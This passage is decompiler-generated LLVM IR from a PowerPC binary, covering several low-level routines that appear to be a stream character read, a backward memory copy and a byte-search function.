  %v0_1000a338 = phi i32 [ %v3_1000a328, %dec_label_pc_1000a328 ], [ %v4_1000a2c8, %dec_label_pc_1000a2b4 ]
  %v1_1000a338 = inttoptr i32 %v0_1000a338 to i8*
  %v2_1000a338 = load i8, i8* %v1_1000a338, align 1
  %v3_1000a338 = zext i8 %v2_1000a338 to i32
  store i32 %v3_1000a338, i32* %r3.global-to-local, align 4
  %v1_1000a33c = add i32 %v0_1000a338, 1
  store i32 %v1_1000a33c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a3ac

dec_label_pc_1000a344:                            ; preds = %dec_label_pc_1000a328
  %v1_1000a344 = add i32 %v2_1000a358, 4
  %v2_1000a344 = inttoptr i32 %v1_1000a344 to i32*
  %v3_1000a344 = load i32, i32* %v2_1000a344, align 4
  store i32 %v3_1000a344, i32* %r0.global-to-local, align 4
  %v3_1000a348 = icmp eq i32 %v3_1000a344, -2
  br i1 %v3_1000a348, label %dec_label_pc_1000a350, label %dec_label_pc_1000a360

dec_label_pc_1000a350:                            ; preds = %dec_label_pc_1000a344
  %v1_1000a350 = or i32 %v3_1000a2f8, 4
  store i32 %v1_1000a350, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000a358 = trunc i32 %v1_1000a350 to i16
  store i16 %v1_1000a358, i16* %v1_1000a2f8, align 2
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a360:                            ; preds = %dec_label_pc_1000a344
  %v1_1000a360 = and i32 %v3_1000a2f8, 768
  store i32 %v1_1000a360, i32* %r0.global-to-local, align 4
  %v3_1000a360 = icmp eq i32 %v1_1000a360, 0
  br i1 %v3_1000a360, label %dec_label_pc_1000a374, label %dec_label_pc_1000a368

dec_label_pc_1000a368:                            ; preds = %dec_label_pc_1000a360
  store i32 ptrtoint (i32** @global_var_10010438.217 to i32), i32* %r3.global-to-local, align 4
  store i32 268477300, i32* @lr, align 4
  %v4_1000a370 = call i32 @function_100068dc(i16* bitcast (i32** @global_var_10010438.217 to i16*), i32 %v3_1000a328)
  store i32 %v4_1000a370, i32* %r3.global-to-local, align 4
  %v0_1000a374.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a374

dec_label_pc_1000a374:                            ; preds = %dec_label_pc_1000a360, %dec_label_pc_1000a368
  %v0_1000a3b4 = phi i32 [ %v2_1000a358, %dec_label_pc_1000a360 ], [ %v0_1000a374.pre, %dec_label_pc_1000a368 ]
  %v1_1000a374 = add i32 %v0_1000a3b4, 8
  %v2_1000a374 = inttoptr i32 %v1_1000a374 to i32*
  %v3_1000a374 = load i32, i32* %v2_1000a374, align 4
  store i32 %v3_1000a374, i32* %r9.global-to-local, align 4
  %v1_1000a378 = add i32 %v0_1000a3b4, 12
  %v2_1000a378 = inttoptr i32 %v1_1000a378 to i32*
  %v3_1000a378 = load i32, i32* %v2_1000a378, align 4
  store i32 %v3_1000a378, i32* %r0.global-to-local, align 4
  %v4_1000a37c = icmp eq i32 %v3_1000a378, %v3_1000a374
  br i1 %v4_1000a37c, label %dec_label_pc_1000a3b4, label %dec_label_pc_1000a384

dec_label_pc_1000a384:                            ; preds = %dec_label_pc_1000a374
  %v2_1000a384 = add i32 %v0_1000a3b4, 24
  %v3_1000a384 = inttoptr i32 %v2_1000a384 to i32*
  store i32 %v3_1000a374, i32* %v3_1000a384, align 4
  %v0_1000a388 = load i32, i32* @r31, align 4
  store i32 %v0_1000a388, i32* %r3.global-to-local, align 4
  store i32 268477328, i32* @lr, align 4
  %v3_1000a38c = call i32 @function_1000b898(i32 %v0_1000a388, i32 %v3_1000a374)
  store i32 %v3_1000a38c, i32* %r3.global-to-local, align 4
  %v3_1000a390 = icmp eq i32 %v3_1000a38c, 0
  br i1 %v3_1000a390, label %dec_label_pc_1000a3d4, label %dec_label_pc_1000a398

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a384
  %v0_1000a398 = load i32, i32* @r31, align 4
  %v1_1000a398 = add i32 %v0_1000a398, 20
  %v2_1000a398 = inttoptr i32 %v1_1000a398 to i32*
  %v3_1000a398 = load i32, i32* %v2_1000a398, align 4
  store i32 %v3_1000a398, i32* %r0.global-to-local, align 4
  %v1_1000a39c = add i32 %v0_1000a398, 16
  %v2_1000a39c = inttoptr i32 %v1_1000a39c to i32*
  %v3_1000a39c = load i32, i32* %v2_1000a39c, align 4
  store i32 %v3_1000a39c, i32* %r9.global-to-local, align 4
  %v2_1000a3a0 = add i32 %v0_1000a398, 24
  %v3_1000a3a0 = inttoptr i32 %v2_1000a3a0 to i32*
  store i32 %v3_1000a398, i32* %v3_1000a3a0, align 4
  %v0_1000a3a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a3a4 = add i32 %v0_1000a3a4, 1
  store i32 %v1_1000a3a4, i32* %r0.global-to-local, align 4
  %v1_1000a3a8 = inttoptr i32 %v0_1000a3a4 to i8*
  %v2_1000a3a8 = load i8, i8* %v1_1000a3a8, align 1
  %v3_1000a3a8 = zext i8 %v2_1000a3a8 to i32
  store i32 %v3_1000a3a8, i32* %r3.global-to-local, align 4
  %v1_1000a3ac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a3ac

dec_label_pc_1000a3ac:                            ; preds = %dec_label_pc_1000a338, %dec_label_pc_1000a398
  %v1_1000a3ac = phi i32 [ %v1_1000a3ac7, %dec_label_pc_1000a338 ], [ %v1_1000a3ac.pre, %dec_label_pc_1000a398 ]
  %v0_1000a3ac = phi i32 [ %v1_1000a33c, %dec_label_pc_1000a338 ], [ %v1_1000a3a4, %dec_label_pc_1000a398 ]
  %v2_1000a3ac = add i32 %v1_1000a3ac, 16
  %v3_1000a3ac = inttoptr i32 %v2_1000a3ac to i32*
  store i32 %v0_1000a3ac, i32* %v3_1000a3ac, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a3b4:                            ; preds = %dec_label_pc_1000a374
  %v1_1000a3b4 = inttoptr i32 %v0_1000a3b4 to i16*
  store i32 %v0_1000a3b4, i32* %r3.global-to-local, align 4
  %v2_1000a3b8 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268477380, i32* @lr, align 4
  %v5_1000a3c0 = call i32 @function_1000b728(i16* %v1_1000a3b4, i32 %v2_1000a3b8, i32 1)
  store i32 %v5_1000a3c0, i32* %r3.global-to-local, align 4
  %v3_1000a3c4 = icmp eq i32 %v5_1000a3c0, 0
  br i1 %v3_1000a3c4, label %dec_label_pc_1000a3d4, label %dec_label_pc_1000a3cc

dec_label_pc_1000a3cc:                            ; preds = %dec_label_pc_1000a3b4
  %v3_1000a3cc = load i8, i8* %stack_var_-24, align 1
  %v4_1000a3cc = sext i8 %v3_1000a3cc to i32
  store i32 %v4_1000a3cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d4:                            ; preds = %dec_label_pc_1000a2e8, %dec_label_pc_1000a3b4, %dec_label_pc_1000a384
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a3cc, %dec_label_pc_1000a3ac, %dec_label_pc_1000a350, %dec_label_pc_1000a304, %dec_label_pc_1000a3d4
  store i32 %v0_1000a2b8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a2bc, i32* @r31, align 4
  %v0_1000a3e8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a3e8

; uselistorder directives
  uselistorder i32 %v0_1000a3b4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000a338, { 1, 0 }
  uselistorder i32 %v3_1000a328, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a308, { 1, 0 }
  uselistorder i32 %v3_1000a2f8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1000a358, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 13, 3, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 14, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* @global_var_10010114.190, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a3d8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a3d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000a374, { 1, 0 }
}

define i32 @function_1000a3ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a3ec:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000a3ec = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000a3f4 = load i32, i32* @r5, align 4
  store i32 %v0_1000a3f4, i32* @r11, align 4
  br i1 %v2_1000a3ec, label %dec_label_pc_1000a400, label %dec_label_pc_1000a3fc

dec_label_pc_1000a3fc:                            ; preds = %dec_label_pc_1000a3ec
  %v0_1000a3fc = call i32 @function_10006d88()
  %v1_1000a400.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000a400

dec_label_pc_1000a400:                            ; preds = %dec_label_pc_1000a3ec, %dec_label_pc_1000a3fc
  %v0_1000a404 = phi i32 [ %arg1, %dec_label_pc_1000a3ec ], [ %v0_1000a3fc, %dec_label_pc_1000a3fc ]
  %v1_1000a400 = phi i32 [ %v0_1000a3f4, %dec_label_pc_1000a3ec ], [ %v1_1000a400.pre, %dec_label_pc_1000a3fc ]
  %v2_1000a400 = add i32 %v1_1000a400, %arg2
  store i32 %v2_1000a400, i32* %r4.global-to-local, align 4
  %v2_1000a404 = add i32 %v1_1000a400, %v0_1000a404
  store i32 %v2_1000a404, i32* %r10.global-to-local, align 4
  %v1_1000a408 = call i32 @__asm_rlwinm.(i32 %v1_1000a400, i32 29, i32 3, i32 31)
  store i32 %v1_1000a408, i32* %r9.global-to-local, align 4
  %v4_1000a408 = icmp eq i32 %v1_1000a408, 0
  br i1 %v4_1000a408, label %dec_label_pc_1000a430, label %dec_label_pc_1000a410

dec_label_pc_1000a410:                            ; preds = %dec_label_pc_1000a400
  %v0_1000a410 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a410 = urem i32 %v0_1000a410, 4
  %v3_1000a410 = icmp eq i32 %v1_1000a410, 0
  br i1 %v3_1000a410, label %dec_label_pc_1000a418, label %dec_label_pc_1000a464

dec_label_pc_1000a418:                            ; preds = %dec_label_pc_1000a47c.dec_label_pc_1000a418_crit_edge, %dec_label_pc_1000a410
  %v1_1000a424.pre = phi i32 [ %v1_1000a424.pre.pre, %dec_label_pc_1000a47c.dec_label_pc_1000a418_crit_edge ], [ %v0_1000a410, %dec_label_pc_1000a410 ]
  %v0_1000a418 = phi i32 [ %v1_1000a47c, %dec_label_pc_1000a47c.dec_label_pc_1000a418_crit_edge ], [ %v1_1000a408, %dec_label_pc_1000a410 ]
  store i32 %v0_1000a418, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a41c

dec_label_pc_1000a41c:                            ; preds = %dec_label_pc_1000a41c, %dec_label_pc_1000a418
  %v1_1000a424 = phi i32 [ %v2_1000a428, %dec_label_pc_1000a41c ], [ %v1_1000a424.pre, %dec_label_pc_1000a418 ]
  %v0_1000a41c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a41c = add i32 %v0_1000a41c, -4
  %v2_1000a41c = inttoptr i32 %v1_1000a41c to i32*
  %v3_1000a41c = load i32, i32* %v2_1000a41c, align 4
  %v1_1000a420 = add i32 %v0_1000a41c, -8
  %v2_1000a420 = inttoptr i32 %v1_1000a420 to i32*
  %v3_1000a420 = load i32, i32* %v2_1000a420, align 4
  store i32 %v3_1000a420, i32* %r9.global-to-local, align 4
  store i32 %v1_1000a420, i32* %r4.global-to-local, align 4
  %v2_1000a424 = add i32 %v1_1000a424, -4
  %v3_1000a424 = inttoptr i32 %v2_1000a424 to i32*
  store i32 %v3_1000a41c, i32* %v3_1000a424, align 4
  %v0_1000a428 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a428 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a428 = add i32 %v1_1000a428, -8
  %v3_1000a428 = inttoptr i32 %v2_1000a428 to i32*
  store i32 %v0_1000a428, i32* %v3_1000a428, align 4
  store i32 %v2_1000a428, i32* %r10.global-to-local, align 4
  %v0_1000a42c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a42c = add i32 %v0_1000a42c, -1
  store i32 %v1_1000a42c, i32* %ctr.global-to-local, align 4
  %v2_1000a42c = icmp eq i32 %v1_1000a42c, 0
  br i1 %v2_1000a42c, label %dec_label_pc_1000a430, label %dec_label_pc_1000a41c

dec_label_pc_1000a430:                            ; preds = %dec_label_pc_1000a41c, %dec_label_pc_1000a47c, %dec_label_pc_1000a400
  %v0_1000a430 = load i32, i32* @r11, align 4
  %v1_1000a430 = urem i32 %v0_1000a430, 8
  store i32 %v1_1000a430, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000a430, 4
  br i1 %tmp, label %dec_label_pc_1000a448, label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a430
  %v0_1000a43c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a43c = add i32 %v0_1000a43c, -4
  %v2_1000a43c = inttoptr i32 %v1_1000a43c to i32*
  %v3_1000a43c = load i32, i32* %v2_1000a43c, align 4
  store i32 %v1_1000a43c, i32* %r4.global-to-local, align 4
  %v1_1000a440 = add nsw i32 %v1_1000a430, -4
  store i32 %v1_1000a440, i32* %r5.global-to-local, align 4
  %v1_1000a444 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a444 = add i32 %v1_1000a444, -4
  %v3_1000a444 = inttoptr i32 %v2_1000a444 to i32*
  store i32 %v3_1000a43c, i32* %v3_1000a444, align 4
  store i32 %v2_1000a444, i32* %r10.global-to-local, align 4
  %v0_1000a448.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a448

dec_label_pc_1000a448:                            ; preds = %dec_label_pc_1000a430, %dec_label_pc_1000a43c
  %v0_1000a450 = phi i32 [ %v1_1000a430, %dec_label_pc_1000a430 ], [ %v0_1000a448.pre, %dec_label_pc_1000a43c ]
  %v3_1000a448 = icmp eq i32 %v0_1000a450, 0
  br i1 %v3_1000a448, label %dec_label_pc_1000a488, label %dec_label_pc_1000a450

dec_label_pc_1000a450:                            ; preds = %dec_label_pc_1000a448
  store i32 %v0_1000a450, i32* %ctr.global-to-local, align 4
  %v2_1000a458.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a454

dec_label_pc_1000a454:                            ; preds = %dec_label_pc_1000a454, %dec_label_pc_1000a450
  %v2_1000a458 = phi i32 [ %v3_1000a458, %dec_label_pc_1000a454 ], [ %v2_1000a458.pre, %dec_label_pc_1000a450 ]
  %v0_1000a454 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a454 = add i32 %v0_1000a454, -1
  %v2_1000a454 = inttoptr i32 %v1_1000a454 to i8*
  %v3_1000a454 = load i8, i8* %v2_1000a454, align 1
  store i32 %v1_1000a454, i32* %r4.global-to-local, align 4
  %v3_1000a458 = add i32 %v2_1000a458, -1
  %v4_1000a458 = inttoptr i32 %v3_1000a458 to i8*
  store i8 %v3_1000a454, i8* %v4_1000a458, align 1
  store i32 %v3_1000a458, i32* %r10.global-to-local, align 4
  %v0_1000a45c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a45c = add i32 %v0_1000a45c, -1
  store i32 %v1_1000a45c, i32* %ctr.global-to-local, align 4
  %v2_1000a45c = icmp eq i32 %v1_1000a45c, 0
  br i1 %v2_1000a45c, label %dec_label_pc_1000a488, label %dec_label_pc_1000a454

dec_label_pc_1000a464:                            ; preds = %dec_label_pc_1000a410
  %v1_1000a464 = sub nsw i32 4, %v1_1000a410
  store i32 %v1_1000a464, i32* %ctr.global-to-local, align 4
  %v1_1000a46c = load i32, i32* @r5, align 4
  %v2_1000a46c = sub i32 %v1_1000a46c, %v1_1000a464
  store i32 %v2_1000a46c, i32* @r11, align 4
  br label %dec_label_pc_1000a470

dec_label_pc_1000a470:                            ; preds = %dec_label_pc_1000a470, %dec_label_pc_1000a464
  %v2_1000a474 = phi i32 [ %v3_1000a474, %dec_label_pc_1000a470 ], [ %v0_1000a410, %dec_label_pc_1000a464 ]
  %v0_1000a470 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a470 = add i32 %v0_1000a470, -1
  %v2_1000a470 = inttoptr i32 %v1_1000a470 to i8*
  %v3_1000a470 = load i8, i8* %v2_1000a470, align 1
  store i32 %v1_1000a470, i32* %r4.global-to-local, align 4
  %v3_1000a474 = add i32 %v2_1000a474, -1
  %v4_1000a474 = inttoptr i32 %v3_1000a474 to i8*
  store i8 %v3_1000a470, i8* %v4_1000a474, align 1
  store i32 %v3_1000a474, i32* %r10.global-to-local, align 4
  %v0_1000a478 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a478 = add i32 %v0_1000a478, -1
  store i32 %v1_1000a478, i32* %ctr.global-to-local, align 4
  %v2_1000a478 = icmp eq i32 %v1_1000a478, 0
  br i1 %v2_1000a478, label %dec_label_pc_1000a47c, label %dec_label_pc_1000a470

dec_label_pc_1000a47c:                            ; preds = %dec_label_pc_1000a470
  %v0_1000a47c = load i32, i32* @r11, align 4
  %v1_1000a47c = call i32 @__asm_rlwinm.(i32 %v0_1000a47c, i32 29, i32 3, i32 31)
  store i32 %v1_1000a47c, i32* %r9.global-to-local, align 4
  %v4_1000a47c = icmp eq i32 %v1_1000a47c, 0
  br i1 %v4_1000a47c, label %dec_label_pc_1000a430, label %dec_label_pc_1000a47c.dec_label_pc_1000a418_crit_edge

dec_label_pc_1000a47c.dec_label_pc_1000a418_crit_edge: ; preds = %dec_label_pc_1000a47c
  %v1_1000a424.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a418

dec_label_pc_1000a488:                            ; preds = %dec_label_pc_1000a454, %dec_label_pc_1000a448
  %v0_1000a488 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000a488

; uselistorder directives
  uselistorder i32 %v1_1000a47c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a478, { 1, 0 }
  uselistorder i32 %v3_1000a474, { 1, 2, 0 }
  uselistorder i32 %v1_1000a45c, { 1, 0 }
  uselistorder i32 %v3_1000a458, { 1, 2, 0 }
  uselistorder i32 %v1_1000a430, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a42c, { 1, 0 }
  uselistorder i32 %v2_1000a428, { 1, 2, 0 }
  uselistorder i32 %v1_1000a410, { 1, 0 }
  uselistorder i32 %v0_1000a410, { 2, 1, 0 }
  uselistorder i32 %v1_1000a400, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 5, 2, 7, 3, 6, 8 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 8, 3, 5, 4, 6, 7, 9 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_1000a448, { 1, 0 }
  uselistorder label %dec_label_pc_1000a430, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a400, { 1, 0 }
}

define i32 @function_1000a490(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a490:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000a494 = urem i32 %arg1, 256
  store i32 %v1_1000a494, i32* %r4.global-to-local, align 4
  %v0_1000a4b47 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000a4b813 = icmp eq i32 %arg2, 0
  br i1 %v2_1000a4b813, label %dec_label_pc_1000a4c0, label %dec_label_pc_1000a4bc

dec_label_pc_1000a4a0:                            ; preds = %dec_label_pc_1000a4bc
  %v1_1000a4a0 = inttoptr i32 %v0_1000a4a0 to i8*
  %v2_1000a4a0 = load i8, i8* %v1_1000a4a0, align 1
  %v3_1000a4a0 = zext i8 %v2_1000a4a0 to i32
  %v0_1000a4a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a4a4 = add i32 %v0_1000a4a4, -1
  store i32 %v1_1000a4a4, i32* %r5.global-to-local, align 4
  %v1_1000a4a8 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a4a8 = icmp eq i32 %v3_1000a4a0, %v1_1000a4a8
  %v0_1000a4ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a4a8, i32 %v0_1000a4ac)
  %v0_1000a4b0 = load i32, i32* @r3, align 4
  %v1_1000a4b0 = add i32 %v0_1000a4b0, 1
  store i32 %v1_1000a4b0, i32* @r3, align 4
  %v0_1000a4b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a4b8 = add i32 %v0_1000a4b8, -1
  store i32 %v1_1000a4b8, i32* %ctr.global-to-local, align 4
  %v2_1000a4b8 = icmp eq i32 %v1_1000a4b8, 0
  br i1 %v2_1000a4b8, label %dec_label_pc_1000a4c0.loopexit, label %dec_label_pc_1000a4bc

dec_label_pc_1000a4bc:                            ; preds = %dec_label_pc_1000a490, %dec_label_pc_1000a4a0
  %v0_1000a4a0 = phi i32 [ %v1_1000a4b0, %dec_label_pc_1000a4a0 ], [ %v0_1000a4b47, %dec_label_pc_1000a490 ]
  %v0_1000a4bc.in.in = phi i32 [ %v1_1000a4b0, %dec_label_pc_1000a4a0 ], [ %v0_1000a4b47, %dec_label_pc_1000a490 ]
  %v0_1000a4bc.in = urem i32 %v0_1000a4bc.in.in, 4
  %v0_1000a4bc = icmp eq i32 %v0_1000a4bc.in, 0
  br i1 %v0_1000a4bc, label %dec_label_pc_1000a4c0.loopexit, label %dec_label_pc_1000a4a0

dec_label_pc_1000a4c0.loopexit:                   ; preds = %dec_label_pc_1000a4bc, %dec_label_pc_1000a4a0
  %v0_1000a4e816.ph = phi i32 [ %v1_1000a4b0, %dec_label_pc_1000a4a0 ], [ %v0_1000a4a0, %dec_label_pc_1000a4bc ]
  %v0_1000a4c0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000a4c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a4c0

dec_label_pc_1000a4c0:                            ; preds = %dec_label_pc_1000a4c0.loopexit, %dec_label_pc_1000a490
  %v0_1000a4c4 = phi i32 [ %v1_1000a494, %dec_label_pc_1000a490 ], [ %v0_1000a4c4.pre, %dec_label_pc_1000a4c0.loopexit ]
  %v0_1000a4c0 = phi i32 [ 0, %dec_label_pc_1000a490 ], [ %v0_1000a4c0.pre, %dec_label_pc_1000a4c0.loopexit ]
  %v0_1000a4e816 = phi i32 [ %v0_1000a4b47, %dec_label_pc_1000a490 ], [ %v0_1000a4e816.ph, %dec_label_pc_1000a4c0.loopexit ]
  %v1_1000a4c0 = udiv i32 %v0_1000a4c0, 4
  %v1_1000a4c4 = mul i32 %v0_1000a4c4, 256
  %v2_1000a4cc = or i32 %v1_1000a4c4, %v0_1000a4c4
  %v1_1000a4d4 = mul i32 %v2_1000a4cc, 65536
  %v2_1000a4dc = or i32 %v1_1000a4d4, %v2_1000a4cc
  store i32 %v1_1000a4c0, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000a4c0, 4
  br i1 %tmp, label %dec_label_pc_1000a570, label %dec_label_pc_1000a4e8

dec_label_pc_1000a4e8:                            ; preds = %dec_label_pc_1000a4c0, %dec_label_pc_1000a56c.backedge
  %v0_1000a56c = phi i32 [ %v1_1000a56c, %dec_label_pc_1000a56c.backedge ], [ %v1_1000a4c0, %dec_label_pc_1000a4c0 ]
  %v0_1000a4f0 = phi i32 [ %v1_1000a4f0, %dec_label_pc_1000a56c.backedge ], [ %v0_1000a4c0, %dec_label_pc_1000a4c0 ]
  %v0_1000a528 = phi i32 [ %v1_1000a4ec, %dec_label_pc_1000a56c.backedge ], [ %v0_1000a4e816, %dec_label_pc_1000a4c0 ]
  %v1_1000a4e8 = inttoptr i32 %v0_1000a528 to i32*
  %v2_1000a4e8 = load i32, i32* %v1_1000a4e8, align 4
  %v1_1000a4ec = add i32 %v0_1000a528, 4
  store i32 %v1_1000a4ec, i32* @r3, align 4
  %v1_1000a4f0 = add i32 %v0_1000a4f0, -4
  store i32 %v1_1000a4f0, i32* %r5.global-to-local, align 4
  %v2_1000a4f4 = xor i32 %v2_1000a4e8, %v2_1000a4dc
  %v1_1000a4fc = add i32 %v2_1000a4f4, 2130640639
  %v2_1000a500 = xor i32 %v1_1000a4fc, %v2_1000a4f4
  %v2_1000a508 = and i32 %v2_1000a500, -2130640640
  %v6_1000a508 = icmp eq i32 %v2_1000a508, -2130640640
  br i1 %v6_1000a508, label %dec_label_pc_1000a56c.backedge, label %dec_label_pc_1000a510

dec_label_pc_1000a56c.backedge:                   ; preds = %dec_label_pc_1000a4e8, %dec_label_pc_1000a558
  %v1_1000a56c = add i32 %v0_1000a56c, -1
  store i32 %v1_1000a56c, i32* %ctr.global-to-local, align 4
  %v2_1000a56c = icmp eq i32 %v1_1000a56c, 0
  br i1 %v2_1000a56c, label %dec_label_pc_1000a570, label %dec_label_pc_1000a4e8

dec_label_pc_1000a510:                            ; preds = %dec_label_pc_1000a4e8
  %v2_1000a510 = inttoptr i32 %v0_1000a528 to i8*
  %v3_1000a510 = load i8, i8* %v2_1000a510, align 1
  %v4_1000a510 = zext i8 %v3_1000a510 to i32
  %v1_1000a514 = add i32 %v0_1000a528, 3
  %v1_1000a518 = add i32 %v0_1000a528, 1
  %v1_1000a51c = add i32 %v0_1000a528, 2
  %v4_1000a520 = icmp eq i32 %v4_1000a510, %v0_1000a4c4
  br i1 %v4_1000a520, label %dec_label_pc_1000a528, label %dec_label_pc_1000a530

dec_label_pc_1000a528:                            ; preds = %dec_label_pc_1000a510
  ret i32 %v0_1000a528

dec_label_pc_1000a530:                            ; preds = %dec_label_pc_1000a510
  %v2_1000a530 = inttoptr i32 %v1_1000a518 to i8*
  %v3_1000a530 = load i8, i8* %v2_1000a530, align 1
  %v4_1000a530 = zext i8 %v3_1000a530 to i32
  %v4_1000a534 = icmp eq i32 %v4_1000a530, %v0_1000a4c4
  br i1 %v4_1000a534, label %dec_label_pc_1000a53c, label %dec_label_pc_1000a544

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a530
  ret i32 %v1_1000a518

dec_label_pc_1000a544:                            ; preds = %dec_label_pc_1000a530
  %v2_1000a544 = inttoptr i32 %v1_1000a51c to i8*
  %v3_1000a544 = load i8, i8* %v2_1000a544, align 1
  %v4_1000a544 = zext i8 %v3_1000a544 to i32
  %v4_1000a548 = icmp eq i32 %v4_1000a544, %v0_1000a4c4
  br i1 %v4_1000a548, label %dec_label_pc_1000a550, label %dec_label_pc_1000a558

dec_label_pc_1000a550:                            ; preds = %dec_label_pc_1000a544
  ret i32 %v1_1000a51c

dec_label_pc_1000a558:                            ; preds = %dec_label_pc_1000a544
  %v2_1000a558 = inttoptr i32 %v1_1000a514 to i8*
  %v3_1000a558 = load i8, i8* %v2_1000a558, align 1
  %v4_1000a558 = zext i8 %v3_1000a558 to i32
  %v4_1000a55c = icmp eq i32 %v4_1000a558, %v0_1000a4c4
  br i1 %v4_1000a55c, label %dec_label_pc_1000a564, label %dec_label_pc_1000a56c.backedge

dec_label_pc_1000a564:                            ; preds = %dec_label_pc_1000a558
  ret i32 %v1_1000a514

dec_label_pc_1000a570:                            ; preds = %dec_label_pc_1000a56c.backedge, %dec_label_pc_1000a4c0
  %v0_1000a57c26 = phi i32 [ %v0_1000a4e816, %dec_label_pc_1000a4c0 ], [ %v1_1000a4ec, %dec_label_pc_1000a56c.backedge ]
  %v0_1000a570 = phi i32 [ %v0_1000a4c0, %dec_label_pc_1000a4c0 ], [ %v1_1000a4f0, %dec_label_pc_1000a56c.backedge ]
  %v1_1000a570 = add i32 %v0_1000a570, 1
  store i32 %v1_1000a570, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a570, i32* %ctr.global-to-local, align 4
  %v2_1000a58c3 = icmp eq i32 %v0_1000a570, 0
  br i1 %v2_1000a58c3, label %dec_label_pc_1000a590, label %dec_label_pc_1000a57c

dec_label_pc_1000a57c:                            ; preds = %dec_label_pc_1000a570, %dec_label_pc_1000a57c.dec_label_pc_1000a57c_crit_edge
  %v1_1000a580 = phi i32 [ %v1_1000a580.pre, %dec_label_pc_1000a57c.dec_label_pc_1000a57c_crit_edge ], [ %v0_1000a4c4, %dec_label_pc_1000a570 ]
  %v0_1000a57c = phi i32 [ %v1_1000a588, %dec_label_pc_1000a57c.dec_label_pc_1000a57c_crit_edge ], [ %v0_1000a57c26, %dec_label_pc_1000a570 ]
  %v1_1000a57c = inttoptr i32 %v0_1000a57c to i8*
